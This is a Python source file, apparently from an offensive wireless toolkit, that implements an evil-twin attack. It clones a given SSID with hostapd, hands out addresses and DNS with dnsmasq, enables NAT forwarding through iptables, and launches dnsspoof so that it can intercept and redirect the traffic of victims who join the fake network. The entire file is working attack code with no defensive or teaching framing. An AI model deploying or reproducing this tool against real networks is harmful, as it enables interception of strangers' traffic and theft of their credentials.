# attacks/evil_twin.py
import os
import subprocess
import threading
temp_dir = '/tmp/airstrike_evil_twin'

HOSTAPD_CONF = os.path.join(temp_dir, 'hostapd.conf')
DNSMASQ_CONF = os.path.join(temp_dir, 'dnsmasq.conf')

class EvilTwin:
    def __init__(self, interface, ssid, channel, web_root='/var/www/html'):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.web_root = web_root
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.dnsspoof_proc = None

    def prepare(self):
        os.makedirs(temp_dir, exist_ok=True)
        # generate hostapd.conf
        with open(HOSTAPD_CONF, 'w') as f:
            f.write(f"""
interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
ignore_broadcast_ssid=0
""")
        # generate dnsmasq.conf
        with open(DNSMASQ_CONF, 'w') as f:
            f.write(f"""
interface={self.interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
""")

    def start(self):
        # bring interface up
        subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], check=True)
        subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.1.1/24', 'dev', self.interface], check=True)
        # enable IP forwarding & NAT
        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'], check=True)
        subprocess.run(['sudo', 'iptables', '-A', 'FORWARD', '-i', self.interface, '-j', 'ACCEPT'], check=True)
        # start hostapd
        self.hostapd_proc = subprocess.Popen(['sudo', 'hostapd', HOSTAPD_CONF])
        # start dnsmasq
        self.dnsmasq_proc = subprocess.Popen(['sudo', 'dnsmasq', '-C', DNSMASQ_CONF, '-d'])
        # start dnsspoof
        self.dnsspoof_proc = subprocess.Popen(['sudo', 'dnsspoof', '-i', self.interface])

    def stop(self):
        for proc in (self.dnsspoof_proc, self.dnsmasq_proc, self.hostapd_proc):
            if proc:
                proc.terminate()
        # restore iptables and interface
        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'])
        subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', self.interface, '-j', 'ACCEPT'])
        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], check=True)
        if os.path.isdir(temp_dir):
            for f in os.listdir(temp_dir): os.remove(os.path.join(temp_dir,f))
            os.rmdir(temp_dir)


